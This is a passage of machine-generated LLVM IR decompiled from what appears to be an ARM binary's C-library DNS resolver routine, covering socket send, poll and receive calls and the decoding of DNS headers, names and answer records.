  %v0_12c10 = load i32, i32* @fp, align 4
  store i32 %v0_12c10, i32* %r3.global-to-local, align 4
  %v0_12c18 = load i32, i32* @sl, align 4
  store i32 %v0_12c18, i32* %r1.global-to-local, align 4
  %v5_12c1c = call i32 @__libc_send(i32 %v3_12be8, i32 %v0_12c18, i32 %v2_12c0c, i32 %v0_12c10, i32 ptrtoint (i32* @0 to i32))
  store i32 702, i32* %r3.global-to-local, align 4
  %v0_12c24 = load i32, i32* @r8, align 4
  %v2_12c24 = add i32 %v0_12c24, 702
  %v3_12c24 = inttoptr i32 %v2_12c24 to i8*
  %v4_12c24 = load i8, i8* %v3_12c24, align 1
  %v6_12c24 = zext i8 %v4_12c24 to i32
  store i32 %v6_12c24, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_12c2c = mul nuw nsw i32 %v6_12c24, 1000
  store i32 %v2_12c2c, i32* @r4, align 4
  store i32 %v2_12c30, i32* @r5, align 4
  br label %dec_label_pc_12c34

dec_label_pc_12c34:                               ; preds = %thread-pre-split, %dec_label_pc_12c0c
  %v0_12c44 = phi i32 [ %v1_12c80, %thread-pre-split ], [ %v2_12c2c, %dec_label_pc_12c0c ]
  store i32 %v3_12be8, i32* %stack_var_-48, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v0_12c44, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v8_12c54 = call i32 @__GI_poll(i32 %v2_12c30, i32 1, i32 %v0_12c44, i32 1, i32 %v3_12be8, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_12c5c = load i32, i32* @sl, align 4
  store i32 %v0_12c5c, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp223 = icmp slt i32 %v8_12c54, 1
  br i1 %tmp223, label %dec_label_pc_13058, label %dec_label_pc_12c70

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12c34
  %v5_12c70 = call i32 @__libc_recv(i32 %v3_12be8, i32 %v0_12c5c, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_12c74 = icmp ugt i32 %v5_12c70, 10
  store i1 %v2_12c74, i1* %cpsr_c.global-to-local, align 1
  %v8_12c7c = icmp sgt i32 %v5_12c70, 11
  br i1 %v8_12c7c, label %dec_label_pc_12ca8, label %dec_label_pc_12c80

dec_label_pc_12c80:                               ; preds = %dec_label_pc_12ca8, %dec_label_pc_12cc4, %dec_label_pc_12c70
  %v0_12c80 = load i32, i32* @r4, align 4
  %v1_12c80 = add i32 %v0_12c80, -1000
  store i32 %v1_12c80, i32* @r4, align 4
  %v7_12c80 = icmp eq i32 %v0_12c80, 1000
  %tmp286 = zext i1 %v7_12c80 to i32
  %. = xor i32 %tmp286, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_12c90 = icmp slt i32 %v5_12c70, 0
  br i1 %v1_12c90, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_12c80
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_13058

thread-pre-split:                                 ; preds = %dec_label_pc_12c80
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_12c80, label %dec_label_pc_13058, label %dec_label_pc_12c34

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12c70
  %v0_12ca8 = load i32, i32* @sl, align 4
  store i32 %v2_12b5c, i32* %r1.global-to-local, align 4
  %v2_12cb0 = inttoptr i32 %v0_12ca8 to i8*
  %v3_12cb0 = call i32 @__decode_header(i8* %v2_12cb0, i32 %v2_12b5c)
  %v3_12cb4 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_12cb4, i32* %r3.global-to-local, align 4
  %v3_12cbc = icmp uge i32 %v3_12cb4, %v3_12b14
  store i1 %v3_12cbc, i1* %cpsr_c.global-to-local, align 1
  %v9_12cbc = icmp eq i32 %v3_12cb4, %v3_12b14
  br i1 %v9_12cbc, label %dec_label_pc_12cc4, label %dec_label_pc_12c80

dec_label_pc_12cc4:                               ; preds = %dec_label_pc_12ca8
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_12cc8, label %dec_label_pc_12c80, label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %dec_label_pc_12cc4
  store i32 %tmp164, i32* %r2.global-to-local, align 4
  store i32 %v1_12cd4, i32* %r3.global-to-local, align 4
  store i1 %v2_12cd8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_12cd4.cmp, label %dec_label_pc_12d14, label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12cd0
  store i32 %v4_1299c, i32* @r1, align 4
  store i1 %v2_12ce4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_12ce4, label %dec_label_pc_12d00, label %dec_label_pc_12cec

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12ce0
  store i32 %v4_12a60, i32* %r2.global-to-local, align 4
  %v1_12cf0 = add i32 %v4_12a60, -1
  store i32 %v1_12cf0, i32* %r3.global-to-local, align 4
  %v0_12cf4 = load i32, i32* @r7, align 4
  %v3_12cf4 = icmp uge i32 %v0_12cf4, %v1_12cf0
  store i1 %v3_12cf4, i1* %cpsr_c.global-to-local, align 1
  %v5_12cf8 = icmp slt i32 %v0_12cf4, %v1_12cf0
  br i1 %v5_12cf8, label %.thread8, label %dec_label_pc_12d00

.thread8:                                         ; preds = %dec_label_pc_12cec
  %v7_12cf8 = add i32 %v0_12cf4, 1
  br label %dec_label_pc_13068

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12cec, %dec_label_pc_12ce0
  store i32 62876, i32* %r3.global-to-local, align 4
  %v0_12d04 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12d44

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12cd0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_12d14, label %dec_label_pc_12d1c, label %dec_label_pc_13058

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12d14
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp218, label %dec_label_pc_12d34, label %dec_label_pc_12d4c

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d1c
  store i32 62824, i32* %r3.global-to-local, align 4
  %v0_12d38 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12d44

dec_label_pc_12d44:                               ; preds = %dec_label_pc_12d00, %dec_label_pc_12d34
  %storemerge3 = phi i32 [ %v0_12d04, %dec_label_pc_12d00 ], [ %v0_12d38, %dec_label_pc_12d34 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_12d00 ], [ 4, %dec_label_pc_12d34 ]
  %storemerge2 = load i32, i32* @global_var_222ac.107, align 4
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v3_12d44 = add i32 %storemerge2, %storemerge3
  %v4_12d44 = inttoptr i32 %v3_12d44 to i32*
  store i32 %storemerge, i32* %v4_12d44, align 4
  br label %dec_label_pc_130a8

dec_label_pc_12d4c:                               ; preds = %dec_label_pc_12d1c
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_12d50.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @r7, align 4
  %v2_12d50 = add i32 %v0_12d50.pre, 12
  store i32 %v2_12d50, i32* @r4, align 4
  %v3_12d50 = icmp ugt i32 %v0_12d50.pre, -13
  store i1 %v3_12d50, i1* %cpsr_c.global-to-local, align 1
  %v9_12d50 = icmp eq i32 %v2_12d50, 0
  br i1 %v9_12d50, label %dec_label_pc_13058, label %dec_label_pc_12d58

dec_label_pc_12d58:                               ; preds = %dec_label_pc_12d4c
  %v2_12d60 = add i32 %v5_12c70, -12
  store i32 %v2_12d60, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp227 = icmp slt i32 %v2_12d60, 1
  br i1 %tmp227, label %dec_label_pc_13058, label %dec_label_pc_12d6c

dec_label_pc_12d64thread-pre-split:               ; preds = %dec_label_pc_12d88
  %v2_12d9416 = add i32 %v2_12d78, -1
  store i32 %v2_12d9416, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp228 = icmp slt i32 %v2_12d9416, 1
  br i1 %tmp228, label %dec_label_pc_13058, label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12d58, %dec_label_pc_12d64thread-pre-split
  %v1_12d90 = phi i32 [ %v2_12d9416, %dec_label_pc_12d64thread-pre-split ], [ %v2_12d60, %dec_label_pc_12d58 ]
  %v0_12d6c = phi i32 [ %v2_12d80, %dec_label_pc_12d64thread-pre-split ], [ %v2_12d50, %dec_label_pc_12d58 ]
  %v1_12d6c = inttoptr i32 %v0_12d6c to i8*
  %v2_12d6c = load i8, i8* %v1_12d6c, align 1
  %v3_12d6c = zext i8 %v2_12d6c to i32
  store i32 %v3_12d6c, i32* %r3.global-to-local, align 4
  %v5_12d6c = add i32 %v0_12d6c, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12d70 = icmp eq i8 %v2_12d6c, 0
  store i32 %v5_12d6c, i32* %r2.global-to-local, align 4
  %v2_12d78 = sub i32 %v1_12d90, %v3_12d6c
  store i32 %v2_12d78, i32* @lr, align 4
  %v2_12d80 = add i32 %v3_12d6c, %v5_12d6c
  br i1 %v2_12d70, label %dec_label_pc_12d9c, label %dec_label_pc_12d88

dec_label_pc_12d88:                               ; preds = %dec_label_pc_12d6c
  %v1_12d7c = and i32 %v3_12d6c, 192
  %v2_12d88 = icmp eq i32 %v1_12d7c, 192
  store i1 %v2_12d88, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_12d88, label %.thread10, label %dec_label_pc_12d64thread-pre-split

.thread10:                                        ; preds = %dec_label_pc_12d88
  %v2_12d8c = add i32 %v0_12d6c, 2
  store i32 %v2_12d8c, i32* %r2.global-to-local, align 4
  %v2_12d90 = add i32 %v1_12d90, -2
  store i32 %v2_12d90, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12d9c

dec_label_pc_12d9c:                               ; preds = %dec_label_pc_12d6c, %.thread10
  %v1_12da8 = phi i32 [ %v2_12d8c, %.thread10 ], [ %v5_12d6c, %dec_label_pc_12d6c ]
  %v0_12d9c = phi i32 [ %v2_12d90, %.thread10 ], [ %v1_12d90, %dec_label_pc_12d6c ]
  %v1_12d9c = add i32 %v0_12d9c, -3
  %v2_12d9c = icmp ugt i32 %v0_12d9c, 2
  store i1 %v2_12d9c, i1* %cpsr_c.global-to-local, align 1
  %v3_12d9c = sub i32 2, %v0_12d9c
  %v4_12d9c = and i32 %v3_12d9c, %v0_12d9c
  %v5_12d9c = icmp slt i32 %v4_12d9c, 0
  %v6_12d9c = icmp slt i32 %v1_12d9c, 0
  %v7_12d9c = icmp eq i32 %v0_12d9c, 3
  %v3_12da0 = xor i1 %v6_12d9c, %v5_12d9c
  %v4_12da0 = or i1 %v7_12d9c, %v3_12da0
  br i1 %v4_12da0, label %dec_label_pc_13058, label %dec_label_pc_12da4

dec_label_pc_12da4:                               ; preds = %dec_label_pc_12d9c
  %v1_12da4 = sub i32 -8, %v0_12d50.pre
  %v2_12da8 = add i32 %v1_12da8, %v1_12da4
  store i32 %v2_12da8, i32* %r3.global-to-local, align 4
  %v3_12da8 = icmp ult i32 %v2_12da8, %v1_12da4
  store i1 %v3_12da8, i1* %cpsr_c.global-to-local, align 1
  %v8_12da8 = icmp slt i32 %v2_12da8, 0
  br i1 %v8_12da8, label %dec_label_pc_13058, label %dec_label_pc_12dcc

dec_label_pc_12dcc:                               ; preds = %dec_label_pc_12da4
  %v2_12db4 = add i32 %v2_12da8, 12
  store i32 1, i32* @r1, align 4
  store i32 %v2_12dd8, i32* @r5, align 4
  %v1_12dec = load i32, i32* @sb, align 4
  %v2_12dec = inttoptr i32 %v1_12dec to i32*
  store i32 0, i32* %v2_12dec, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1302c57, label %dec_label_pc_12df4, label %dec_label_pc_13030

dec_label_pc_12df4:                               ; preds = %dec_label_pc_12dcc, %dec_label_pc_13008
  %stack_var_-460.365 = phi i32 [ %v2_13010, %dec_label_pc_13008 ], [ %v2_12db4, %dec_label_pc_12dcc ]
  %stack_var_-452.062 = phi i32 [ %v1_13014, %dec_label_pc_13008 ], [ 0, %dec_label_pc_12dcc ]
  %stack_var_-480.261 = phi i32 [ %stack_var_-480.1, %dec_label_pc_13008 ], [ 1, %dec_label_pc_12dcc ]
  %v0_12df4 = load i32, i32* @sl, align 4
  store i32 %stack_var_-460.365, i32* @r1, align 4
  store i32 %v5_12c70, i32* %r2.global-to-local, align 4
  store i32 %v2_12dd4, i32* %r3.global-to-local, align 4
  store i32 256, i32* @r7, align 4
  %v5_12e0c = call i32 @__decode_dotted(i32 %v0_12df4, i32 %stack_var_-460.365, i32 %v5_12c70, i32 %v2_12dd4, i32 256)
  store i32 %v5_12e0c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_12e10 = icmp slt i32 %v5_12e0c, 0
  br i1 %v1_12e10, label %dec_label_pc_12ee0, label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %dec_label_pc_12df4
  %v1_12e20 = add i32 %v5_12e0c, 10
  store i32 %v1_12e20, i32* @fp, align 4
  %v2_12e24 = sub i32 %v5_12c70, %stack_var_-460.365
  %v2_12e28 = sub i32 %v2_12e24, %v1_12e20
  store i32 %v2_12e28, i32* %r3.global-to-local, align 4
  %v3_12e28 = icmp uge i32 %v2_12e24, %v1_12e20
  store i1 %v3_12e28, i1* %cpsr_c.global-to-local, align 1
  %v8_12e28 = icmp slt i32 %v2_12e28, 0
  br i1 %v8_12e28, label %dec_label_pc_12ed8.thread, label %dec_label_pc_12e38

dec_label_pc_12ed8.thread:                        ; preds = %dec_label_pc_12e18
  store i32 %v2_12e28, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_12ee0

dec_label_pc_12e38:                               ; preds = %dec_label_pc_12e18
  %v2_12e3c = call i32 @__GI_strdup(i8* %v1_12e3c)
  %v0_12e44 = load i32, i32* @r4, align 4
  %v2_12e44 = add i32 %v0_12e44, %stack_var_-460.365
  %v0_12e48 = load i32, i32* @sl, align 4
  %v2_12e48 = add i32 %v0_12e48, %v2_12e44
  store i32 %v2_12e48, i32* %r1.global-to-local, align 4
  %v1_12e4c = add i32 %v2_12e48, 2
  %v1_12e50 = add i32 %v2_12e48, 4
  store i32 %v1_12e50, i32* %r3.global-to-local, align 4
  %v1_12e54 = add i32 %v2_12e48, 5
  %v2_12e54 = inttoptr i32 %v1_12e54 to i8*
  %v3_12e54 = load i8, i8* %v2_12e54, align 1
  %v4_12e54 = zext i8 %v3_12e54 to i32
  %v2_12e58 = inttoptr i32 %v1_12e50 to i8*
  %v3_12e58 = load i8, i8* %v2_12e58, align 1
  %v4_12e58 = zext i8 %v3_12e58 to i32
  %v1_12e5c = add i32 %v2_12e48, 8
  %v2_12e5c = inttoptr i32 %v1_12e5c to i8*
  %v3_12e5c = load i8, i8* %v2_12e5c, align 1
  %v4_12e5c = zext i8 %v3_12e5c to i32
  %v1_12e60 = add i32 %v2_12e48, 7
  %v2_12e60 = inttoptr i32 %v1_12e60 to i8*
  %v3_12e60 = load i8, i8* %v2_12e60, align 1
  %v4_12e60 = zext i8 %v3_12e60 to i32
  store i32 %v4_12e60, i32* %r2.global-to-local, align 4
  %v1_12e68 = add i32 %v2_12e48, 6
  %v2_12e68 = inttoptr i32 %v1_12e68 to i8*
  %v3_12e68 = load i8, i8* %v2_12e68, align 1
  %v4_12e68 = zext i8 %v3_12e68 to i32
  store i32 %v4_12e68, i32* %r3.global-to-local, align 4
  %v1_12e6c = add i32 %v2_12e48, 9
  %v2_12e6c = inttoptr i32 %v1_12e6c to i8*
  %v3_12e6c = load i8, i8* %v2_12e6c, align 1
  %v4_12e6c = zext i8 %v3_12e6c to i32
  %v3_12e74 = inttoptr i32 %v2_12e48 to i8*
  %v4_12e74 = load i8, i8* %v3_12e74, align 1
  %v6_12e74 = zext i8 %v4_12e74 to i32
  %v1_12e78 = add i32 %v2_12e48, 3
  %v2_12e78 = inttoptr i32 %v1_12e78 to i8*
  %v3_12e78 = load i8, i8* %v2_12e78, align 1
  %v4_12e78 = zext i8 %v3_12e78 to i32
  store i32 %v4_12e78, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_12e7c = mul nuw i32 %v4_12e58, 16777216
  %v5_12e7c = or i32 %v4_12e60, %v4_12e7c
  store i32 %v5_12e7c, i32* %r2.global-to-local, align 4
  %v2_12e80 = inttoptr i32 %v1_12e4c to i8*
  %v3_12e80 = load i8, i8* %v2_12e80, align 1
  %v4_12e80 = zext i8 %v3_12e80 to i32
  %v1_12e84 = add i32 %v2_12e48, 1
  %v2_12e84 = inttoptr i32 %v1_12e84 to i8*
  %v3_12e84 = load i8, i8* %v2_12e84, align 1
  %v4_12e84 = zext i8 %v3_12e84 to i32
  %v4_12e88 = mul nuw nsw i32 %v4_12e5c, 256
  %v5_12e88 = or i32 %v4_12e6c, %v4_12e88
  store i32 %v5_12e88, i32* @r6, align 4
  store i32 %v4_12e54, i32* @r7, align 4
  %v4_12e90 = mul nuw nsw i32 %v6_12e74, 256
  %v5_12e90 = or i32 %v4_12e84, %v4_12e90
  store i32 %v5_12e90, i32* @lr, align 4
  %v4_12e94 = mul nuw nsw i32 %v4_12e80, 256
  %v5_12e94 = or i32 %v4_12e94, %v4_12e78
  store i32 %v5_12e94, i32* %r3.global-to-local, align 4
  store i32 %v2_12e28, i32* @r5, align 4
  %v4_12ea0 = mul nuw nsw i32 %v4_12e54, 65536
  %v5_12ea0 = or i32 %v5_12e7c, %v4_12ea0
  %v4_12ea4 = mul nuw nsw i32 %v4_12e68, 256
  %v5_12ea4 = or i32 %v5_12ea0, %v4_12ea4
  store i32 %v5_12ea4, i32* %r2.global-to-local, align 4
  %v1_12ea8 = add i32 %v2_12e48, 10
  store i32 %v1_12ea8, i32* @r1, align 4
  %v1_12eac = add i32 %v2_12e44, 10
  store i32 %v1_12eac, i32* @r4, align 4
  %v2_12eb0 = sub i32 %v2_12e28, %v5_12e88
  %v3_12eb0 = icmp uge i32 %v2_12e28, %v5_12e88
  store i1 %v3_12eb0, i1* %cpsr_c.global-to-local, align 1
  %tmp230 = sub i32 0, %v2_12eb0
  %v6_12eb0 = and i32 %v2_12e28, %tmp230
  %v7_12eb0 = icmp slt i32 %v6_12eb0, 0
  %v8_12eb0 = icmp slt i32 %v2_12eb0, 0
  store i32 %v2_12e3c, i32* %stack_var_-144, align 4
  %v2_12ed0 = xor i1 %v8_12eb0, %v7_12eb0
  br i1 %v2_12ed0, label %dec_label_pc_12ee0, label %dec_label_pc_12ed8

dec_label_pc_12ed8:                               ; preds = %dec_label_pc_12e38
  %v0_12ed4 = load i32, i32* @fp, align 4
  %v2_12ed4 = add i32 %v0_12ed4, %v5_12e88
  store i32 %v2_12ed4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_12ed8 = icmp slt i32 %v2_12ed4, 0
  br i1 %v1_12ed8, label %dec_label_pc_12ee0, label %dec_label_pc_12efc

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ed8, %dec_label_pc_12e38, %dec_label_pc_12df4, %dec_label_pc_12ed8.thread
  store i32 %stack_var_-452.062, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12ee4 = icmp eq i32 %stack_var_-452.062, 0
  br i1 %v2_12ee4, label %dec_label_pc_13058, label %dec_label_pc_12eec

dec_label_pc_12eec:                               ; preds = %dec_label_pc_12ee0
  store i32 %tmp148, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_12ef0, label %dec_label_pc_13058, label %dec_label_pc_13030

dec_label_pc_12efc:                               ; preds = %dec_label_pc_12ed8
  store i32 %stack_var_-480.261, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12f00 = icmp eq i32 %stack_var_-480.261, 0
  br i1 %v2_12f00, label %dec_label_pc_12fb0, label %dec_label_pc_12f08

dec_label_pc_12f08:                               ; preds = %dec_label_pc_12efc
  %v0_12f08 = load i32, i32* @sb, align 4
  %v1_12f08 = add i32 %v0_12f08, 28
  %v2_12f08 = inttoptr i32 %v1_12f08 to i32*
  %v3_12f08 = load i32, i32* %v2_12f08, align 4
  store i32 %v3_12f08, i32* @r3, align 4
  %v1_12f0c = add i32 %v0_12f08, 32
  %v2_12f0c = inttoptr i32 %v1_12f0c to i32*
  %v3_12f0c = load i32, i32* %v2_12f0c, align 4
  store i32 %v3_12f0c, i32* %r2.global-to-local, align 4
  %v1_12f10 = add i32 %v0_12f08, 36
  %v2_12f10 = inttoptr i32 %v1_12f10 to i32*
  %v3_12f10 = load i32, i32* %v2_12f10, align 4
  store i32 %v3_12f10, i32* %r1.global-to-local, align 4
  %v1_12f14 = inttoptr i32 %v0_12f08 to i32*
  %v2_12f14 = load i32, i32* %v1_12f14, align 4
  store i32 %v2_12f14, i32* @r0, align 4
  %v0_12f24 = call i32 @free()
  store i32 40, i32* @r2, align 4
  %v0_12f2c = load i32, i32* @sb, align 4
  store i32 %v0_12f2c, i32* @r0, align 4
  store i32 %v2_12dd8, i32* @r1, align 4
  %v0_12f34 = call i32 @memcpy()
  %v0_12f38 = load i32, i32* @sb, align 4
  %v1_12f38 = add i32 %v0_12f38, 4
  %v2_12f38 = inttoptr i32 %v1_12f38 to i32*
  %v3_12f38 = load i32, i32* %v2_12f38, align 4
  store i32 %v3_12f38, i32* %r2.global-to-local, align 4
  %v2_12f3c = icmp ugt i32 %v3_12f38, 23
  store i1 %v2_12f3c, i1* %cpsr_c.global-to-local, align 1
  %v7_12f3c = icmp eq i32 %v3_12f38, 24
  br i1 %v7_12f3c, label %dec_label_pc_12f60, label %dec_label_pc_12f44

dec_label_pc_12f44:                               ; preds = %dec_label_pc_12f08
  %v1_12f44 = add i32 %v0_12f38, 28
  %v2_12f44 = inttoptr i32 %v1_12f44 to i32*
  %v3_12f44 = load i32, i32* %v2_12f44, align 4
  store i32 %v3_12f44, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12f48 = icmp eq i32 %v3_12f44, 0
  br i1 %v2_12f48, label %dec_label_pc_13030, label %dec_label_pc_12f50

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12f44
  store i1 %v2_12f54, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_12f54, label %dec_label_pc_12f60, label %bb231

bb231:                                            ; preds = %dec_label_pc_12f50
  store i1 %v3_12f58, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_12f58, label %dec_label_pc_12f60, label %dec_label_pc_13030

dec_label_pc_12f60:                               ; preds = %dec_label_pc_12f50, %bb231, %dec_label_pc_12f08
  store i32 %v0_12924, i32* %r1.global-to-local, align 4
  %v3_12f64 = icmp uge i32 %v3_12f38, %v0_12924
  store i1 %v3_12f64, i1* %cpsr_c.global-to-local, align 1
  %v9_12f64 = icmp eq i32 %v3_12f38, %v0_12924
  br i1 %v9_12f64, label %dec_label_pc_12f74, label %bb232

bb232:                                            ; preds = %dec_label_pc_12f60
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13008

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12f60
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.062, i32* @r5, align 4
  %v1_12f7c = add i32 %v0_12f38, 16
  %v2_12f7c = inttoptr i32 %v1_12f7c to i32*
  %v3_12f7c = load i32, i32* %v2_12f7c, align 4
  %v2_12f80 = sub i32 %tmp163, %stack_var_-452.062
  %v1_12f84 = add i32 %v2_12f80, -1
  store i32 %v1_12f84, i32* %r3.global-to-local, align 4
  %v1_12f88 = add i32 %v3_12f7c, 4
  store i32 %v1_12f88, i32* %r2.global-to-local, align 4
  %v2_12f8c = mul i32 %v1_12f88, %v1_12f84
  store i32 %v2_12f8c, i32* @r1, align 4
  %v1_12f90 = add i32 %v0_12f38, 32
  %v2_12f90 = inttoptr i32 %v1_12f90 to i32*
  %v3_12f90 = load i32, i32* %v2_12f90, align 4
  store i32 %v3_12f90, i32* %r2.global-to-local, align 4
  %v3_12f94 = icmp uge i32 %v2_12f8c, %v3_12f90
  store i1 %v3_12f94, i1* %cpsr_c.global-to-local, align 1
  %v2_12f98 = add i32 %v0_12f38, 36
  %v3_12f98 = inttoptr i32 %v2_12f98 to i32*
  store i32 %v1_12f84, i32* %v3_12f98, align 4
  %tmp289 = icmp ugt i32 %v2_12f8c, %v3_12f90
  br i1 %tmp289, label %dec_label_pc_13030, label %dec_label_pc_12fa0

dec_label_pc_12fa0:                               ; preds = %dec_label_pc_12f74
  store i32 0, i32* @r7, align 4
  %v1_12fa8 = load i32, i32* @sb, align 4
  %v2_12fa8 = add i32 %v1_12fa8, 36
  %v3_12fa8 = inttoptr i32 %v2_12fa8 to i32*
  store i32 0, i32* %v3_12fa8, align 4
  br label %dec_label_pc_13008

dec_label_pc_12fb0:                               ; preds = %dec_label_pc_12efc
  store i32 %v2_12e3c, i32* @r0, align 4
  %v0_12fb4 = call i32 @free()
  store i32 %v5_12e90, i32* %r3.global-to-local, align 4
  store i32 %v0_12924, i32* @ip, align 4
  %v3_12fc0 = icmp uge i32 %v5_12e90, %v0_12924
  store i1 %v3_12fc0, i1* %cpsr_c.global-to-local, align 1
  %v9_12fc0 = icmp eq i32 %v5_12e90, %v0_12924
  br i1 %v9_12fc0, label %dec_label_pc_12fc8, label %dec_label_pc_13008

dec_label_pc_12fc8:                               ; preds = %dec_label_pc_12fb0
  %v0_12fc8 = load i32, i32* @sb, align 4
  %v1_12fc8 = add i32 %v0_12fc8, 16
  %v2_12fc8 = inttoptr i32 %v1_12fc8 to i32*
  %v3_12fc8 = load i32, i32* %v2_12fc8, align 4
  store i32 %v3_12fc8, i32* %r1.global-to-local, align 4
  store i32 %v5_12e88, i32* %r3.global-to-local, align 4
  %v3_12fd0 = icmp uge i32 %v3_12fc8, %v5_12e88
  store i1 %v3_12fd0, i1* %cpsr_c.global-to-local, align 1
  %v9_12fd0 = icmp eq i32 %v3_12fc8, %v5_12e88
  br i1 %v9_12fd0, label %dec_label_pc_12fe4, label %dec_label_pc_12fd8

dec_label_pc_12fd8:                               ; preds = %dec_label_pc_12fc8
  %v1_12fd8 = inttoptr i32 %v0_12fc8 to i32*
  %v2_12fd8 = load i32, i32* %v1_12fd8, align 4
  store i32 %v2_12fd8, i32* @r0, align 4
  %v0_12fdc = call i32 @free()
  br label %dec_label_pc_13058

dec_label_pc_12fe4:                               ; preds = %dec_label_pc_12fc8
  %v1_12fe4 = add i32 %v0_12fc8, 36
  %v2_12fe4 = inttoptr i32 %v1_12fe4 to i32*
  %v3_12fe4 = load i32, i32* %v2_12fe4, align 4
  store i32 %v3_12fe4, i32* %r2.global-to-local, align 4
  %v1_12fe8 = add i32 %v0_12fc8, 28
  %v2_12fe8 = inttoptr i32 %v1_12fe8 to i32*
  %v3_12fe8 = load i32, i32* %v2_12fe8, align 4
  store i32 %v3_12fe8, i32* @r3, align 4
  %v3_12fec = mul i32 %v3_12fe4, %v5_12e88
  %v4_12fec = add i32 %v3_12fe8, %v3_12fec
  store i32 %v4_12fec, i32* @r0, align 4
  store i32 %v5_12e88, i32* @r2, align 4
  store i32 %v1_12ea8, i32* @r1, align 4
  %v0_12ff8 = call i32 @memcpy()
  %v0_12ffc = load i32, i32* @sb, align 4
  %v1_12ffc = add i32 %v0_12ffc, 36
  %v2_12ffc = inttoptr i32 %v1_12ffc to i32*
  %v3_12ffc = load i32, i32* %v2_12ffc, align 4
  %v1_13000 = add i32 %v3_12ffc, 1
  store i32 %v1_13000, i32* %r3.global-to-local, align 4
  store i32 %v1_13000, i32* %v2_12ffc, align 4
  br label %dec_label_pc_13008

dec_label_pc_13008:                               ; preds = %bb232, %dec_label_pc_12fb0, %dec_label_pc_12fa0, %dec_label_pc_12fe4
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_12fe4 ], [ 0, %dec_label_pc_12fb0 ], [ 0, %dec_label_pc_12fa0 ], [ 1, %bb232 ]
  %v1_13010 = load i32, i32* @r4, align 4
  %v2_13010 = add i32 %v1_13010, %stack_var_-460.365
  %v1_13014 = add nuw nsw i32 %stack_var_-452.062, 1
  store i32 %v1_13014, i32* @r1, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %v1_13014, i32* %r2.global-to-local, align 4
  %v3_13028 = icmp uge i32 %v1_13014, %tmp163
  store i1 %v3_13028, i1* %cpsr_c.global-to-local, align 1
  %v5_1302c = icmp slt i32 %v1_13014, %tmp163
  br i1 %v5_1302c, label %dec_label_pc_12df4, label %dec_label_pc_13030

